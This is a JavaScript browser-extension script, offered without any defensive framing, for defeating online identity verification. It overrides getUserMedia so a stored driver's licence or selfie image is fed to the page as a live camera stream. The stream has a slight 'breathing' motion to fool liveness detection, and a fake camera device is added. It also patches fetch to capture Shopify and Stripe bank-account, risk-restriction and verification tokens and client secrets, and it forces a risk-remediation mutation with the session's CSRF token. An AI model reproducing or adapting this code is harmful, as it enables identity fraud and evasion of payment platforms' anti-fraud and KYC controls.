// MAIN world — patches fetch + camera (getUserMedia)

// ─────────────────────────────────────────────────────────────────────────────
// CAMERA FAKE STREAM
// ─────────────────────────────────────────────────────────────────────────────
;(function patchCamera() {

  // Global image store — filled by bridge.js via postMessage
  window.__IDV__ = window.__IDV__ || { dlFront: null, dlBack: null, selfies: [], phase: 'id' }

  window.addEventListener('message', ev => {
    if (ev.source !== window) return
    const d = ev.data
    if (d?._idv === 'IDV_SET') {
      if (d.dlFront  != null) window.__IDV__.dlFront  = d.dlFront
      if (d.dlBack   != null) window.__IDV__.dlBack   = d.dlBack
      if (d.selfies  != null) window.__IDV__.selfies  = d.selfies
      if (d.phase    != null) window.__IDV__.phase    = d.phase
    }
  })

  // Watch DOM for phase-switch keywords
  function startPhaseWatcher() {
    const SELFIE_KEYWORDS = ['selfie', 'face', 'look at the camera', 'take a photo of yourself', 'position your face']
    const ID_KEYWORDS     = ['move your id', 'hold your id', 'front of id', 'back of id', 'driver', 'passport']

    const obs = new MutationObserver(() => {
      const text = document.body?.innerText?.toLowerCase() || ''
      const wasSelfie = window.__IDV__.phase === 'selfie'
      if (!wasSelfie && SELFIE_KEYWORDS.some(k => text.includes(k))) {
        window.__IDV__.phase = 'selfie'
        window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
        console.log('[IDV] Phase → selfie')
      } else if (wasSelfie && ID_KEYWORDS.some(k => text.includes(k))) {
        window.__IDV__.phase = 'id'
        window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'id' }, '*')
        console.log('[IDV] Phase → id')
      }
    })
    if (document.body) {
      obs.observe(document.body, { childList: true, subtree: true, characterData: true })
    } else {
      document.addEventListener('DOMContentLoaded', () => {
        obs.observe(document.body, { childList: true, subtree: true, characterData: true })
      })
    }
  }
  startPhaseWatcher()

  // Build a canvas-based fake video stream from an image src
  async function buildFakeStream(src) {
    const canvas = document.createElement('canvas')
    canvas.width  = 1280
    canvas.height = 720
    const ctx = canvas.getContext('2d')

    // Draw black background first
    ctx.fillStyle = '#111'
    ctx.fillRect(0, 0, canvas.width, canvas.height)

    const img = new Image()
    img.src = src
    await new Promise(resolve => {
      img.onload  = resolve
      img.onerror = resolve
      setTimeout(resolve, 4000)
    })

    if (!img.naturalWidth) {
      console.log('[IDV] Image failed to load')
      return null
    }

    // Calculate fit-with-padding rect (like object-fit: contain)
    const iw = img.naturalWidth, ih = img.naturalHeight
    const cw = canvas.width,     ch = canvas.height
    const scale = Math.min(cw / iw, ch / ih) * 0.92
    const x = (cw - iw * scale) / 2
    const y = (ch - ih * scale) / 2

    let tick = 0
    function drawFrame() {
      ctx.fillStyle = '#111'
      ctx.fillRect(0, 0, cw, ch)

      // Subtle breathing motion (1% scale) to fool motion detectors
      const breathe = 1 + 0.008 * Math.sin(tick * 0.04)
      const bx = (cw - iw * scale * breathe) / 2
      const by = (ch - ih * scale * breathe) / 2

      ctx.save()
      ctx.drawImage(img, bx, by, iw * scale * breathe, ih * scale * breathe)
      ctx.restore()

      tick++
    }

    drawFrame()
    const interval = setInterval(drawFrame, 33) // ~30fps

    const stream = canvas.captureStream(30)
    const track  = stream.getVideoTracks()[0]

    // Override getSettings to report realistic values
    const origGetSettings = track.getSettings.bind(track)
    track.getSettings = () => ({
      ...origGetSettings(),
      width: canvas.width,
      height: canvas.height,
      frameRate: 30,
      facingMode: 'environment'
    })

    const origStop = track.stop.bind(track)
    track.stop = () => { clearInterval(interval); origStop() }

    console.log('[IDV] Fake stream ready (phase:', window.__IDV__.phase, ')')
    return stream
  }

  // Pick the right image based on current phase
  function pickImage() {
    const phase = window.__IDV__.phase
    if (phase === 'selfie') {
      return window.__IDV__.selfies?.[0] || window.__IDV__.dlFront
    }
    return window.__IDV__.dlFront
  }

  // Main getUserMedia patch
  if (navigator.mediaDevices) {
    const _origGUM = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices)

    navigator.mediaDevices.getUserMedia = async function (constraints) {
      if (!constraints?.video) return _origGUM(constraints)

      // Wait up to 8 seconds for images from bridge
      for (let i = 0; i < 40; i++) {
        if (window.__IDV__.dlFront) break
        await new Promise(r => setTimeout(r, 200))
      }

      const src = pickImage()
      if (!src) {
        console.log('[IDV] No image stored — using real camera')
        return _origGUM(constraints)
      }

      const stream = await buildFakeStream(src)
      if (!stream) {
        console.log('[IDV] Stream build failed — using real camera')
        return _origGUM(constraints)
      }

      return stream
    }

    // Also make enumerateDevices return a camera so permission prompt is minimal
    const _origEnum = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices)
    navigator.mediaDevices.enumerateDevices = async function () {
      const real = await _origEnum().catch(() => [])
      if (!real.some(d => d.kind === 'videoinput')) {
        real.push({
          deviceId: 'idv-fake',
          groupId:  'idv-fake',
          kind:     'videoinput',
          label:    'IDV Virtual Camera',
          toJSON() { return this }
        })
      }
      return real
    }

    console.log('[IDV] Camera patch installed on', window.location.hostname)
  }

})()

// ─────────────────────────────────────────────────────────────────────────────
// FETCH PATCH — captures Shopify/Stripe tokens
// ─────────────────────────────────────────────────────────────────────────────
const PATTERNS = [
  'banking_home_banking',
  'payments/banking',
  'shopify/graphql',
  'verificationhub.shopify.com',
  'verify.stripe.com'
]

function getStore() {
  const m = window.location.pathname.match(/\/store\/([^/?#]+)/)
  return m?.[1] ?? null
}

function gidToId(gid) {
  if (!gid) return null
  const m = String(gid).match(/\/(\d+)$/)
  return m ? m[1] : String(gid)
}

function parseCaptures(url, data) {
  const out = {}

  if (url.includes('banking_home_banking') || url.includes('payments/banking')) {
    const ba = data.bankAccount || data?.data?.bankAccount
    if (ba?.id) {
      out.bank_account_id  = gidToId(ba.id)
      out.bank_account_gid = ba.id
    }
    const restrictions = ba?.riskRestrictions || []
    out.risk_restrictions = restrictions.map(r => ({ id: gidToId(r.id), gid: r.id, status: r.status }))
    const active = restrictions.find(r => r.status === 'ACTIVE')
    if (active) {
      out.active_restriction_id     = gidToId(active.id)
      out.active_restriction_gid    = active.id
      out.active_restriction_status = 'ACTIVE'
    }
    const principal = data.principal || data?.data?.principal
    if (principal?.id) {
      out.principal_id  = gidToId(principal.id)
      out.principal_gid = principal.id
    }
    out._event = 'banking_home'
  }

  if (url.includes('shopify/graphql') || url.includes('verificationhub.shopify.com')) {
    const d = data.data || {}

    const pgrr = d.payoutGateRemediate
    if (pgrr?.challengeToken) {
      out.jwt      = pgrr.challengeToken
      out.jwt_type = 'pgrr_challenge'
      out._event   = 'pgrr_jwt_minted'
    }

    const rrr = d.remediateRiskRestriction
    if (rrr?.challengeToken) {
      out.jwt      = rrr.challengeToken
      out.jwt_type = 'remediate_challenge'
      out._event   = 'remediate_risk_restriction'
    }

    for (const k of Object.keys(d)) {
      if (k.startsWith('createIVA') || k.startsWith('createIdentityVerification')) {
        const vs = d[k]?.verificationSession
        if (vs) {
          out.ek           = vs.id
          out.ek_client_secret = vs.clientSecret
          out.assessment_ref   = vs.referenceId
          out.civa_variant     = k
          out._event           = 'civa_ek_minted'
          break
        }
      }
    }

    const ca = d.createAssessment
    if (ca?.assessmentReference) {
      out.vhub_assessment_ref = ca.assessmentReference
      out._event = 'vhub_assessment_created'
    }

    const bh = d.shopifyPaymentsAccount?.bankAccount || d.bankAccount
    if (bh?.riskRestrictions !== undefined) {
      const hasActive = bh.riskRestrictions.some(r => r.status === 'ACTIVE')
      out.discharge_detected = !hasActive
      out._event = hasActive ? 'poll_still_active' : 'discharge_detected'
    }

    out._scope = url.includes('verificationhub') ? 'vhub' : 'shopify'
  }

  if (url.includes('verify.stripe.com')) {
    const session = data.session || data
    if (session.status) {
      out.stripe_session_status = session.status
      out._event = 'stripe_status_' + session.status
    }
  }

  const pubKeys = Object.keys(out).filter(k => !k.startsWith('_'))
  return pubKeys.length > 0 ? out : null
}

function sendCapture(url, data) {
  const captures = parseCaptures(url, data)
  if (!captures) return
  window.postMessage({ _idv: 'CAPTURE', store: getStore(), url, captures, timestamp: Date.now() }, '*')
}

// Force verify via postMessage
window.addEventListener('message', async ev => {
  if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
  const csrf =
    document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') ||
    window?.Shopify?.csrfToken || ''

  const mutation = `mutation RemediateIDV($id: ID!) {
    remediateRiskRestriction(input: { riskRestrictionId: $id }) {
      challengeToken
      userErrors { field message }
    }
  }`
  try {
    const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        ...(csrf ? { 'X-CSRF-Token': csrf } : {})
      },
      body: JSON.stringify({ operationName: 'RemediateIDV', query: mutation, variables: { id: ev.data.riskRestrictionId } })
    })
    const data = await res.json()
    sendCapture('https://admin.shopify.com/api/shopify/graphql.json', data)
    const rrr = data?.data?.remediateRiskRestriction
    if (rrr?.challengeToken) {
      window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: true } }, '*')
    } else {
      const errs = rrr?.userErrors?.map(e => e.message).join(', ') || JSON.stringify(data).slice(0, 120)
      window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: false, error: errs } }, '*')
    }
  } catch (e) {
    window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: false, error: String(e) } }, '*')
  }
})

// Patch fetch
const _origFetch = window.fetch.bind(window)
window.fetch = async function (input, init) {
  const res = await _origFetch(input, init)
  const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url
  if (PATTERNS.some(p => url.includes(p))) {
    res.clone().json().then(data => sendCapture(url, data)).catch(() => {})
  }
  return res
}
